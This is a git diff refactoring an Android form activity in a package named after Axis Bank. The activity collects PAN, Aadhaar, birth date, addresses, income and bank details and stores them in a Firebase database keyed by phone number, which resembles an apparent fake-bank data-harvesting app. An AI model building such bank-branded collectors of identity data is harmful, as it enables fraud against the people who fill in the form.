@@ -1,4 +1,4 @@
-package com.bank.axisbank;
+package com.bank.axisbank.screen;
 
 import android.content.Context;
 import android.content.Intent;
@@ -10,7 +10,6 @@ import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
-import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.Spinner;
 import android.widget.Toast;
@@ -18,6 +17,9 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.bank.axisbank.R;
+import com.bank.axisbank.model.UserData;
+import com.bank.axisbank.model.phone;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.database.DatabaseReference;
@@ -33,7 +35,6 @@ public class formActivity extends AppCompatActivity {
     LinearLayout loading;
     View loadingoverlay;
     Button submit ;
-    private ImageView calendarImage;
     public static FirebaseDatabase db ;
     public static DatabaseReference ref;
 
@@ -193,7 +194,7 @@ public class formActivity extends AppCompatActivity {
                     String phoneNum = phone.getPhone();
                     db = FirebaseDatabase.getInstance();
                     ref=db.getReference().child(phoneNum);
-                    String userId = ref.getKey().toString();
+//                  String userId = ref.getKey().toString();
                     UserData userData= new UserData(phoneNum,name,email,Date_of_Birth,pan,aadhar,PAddress,CAddress,COUNTRY,STATE,Pincode,income,BANK);
                     ref.child("Personal Information").setValue(userData).addOnCompleteListener(new OnCompleteListener<Void>() {
                         @Override
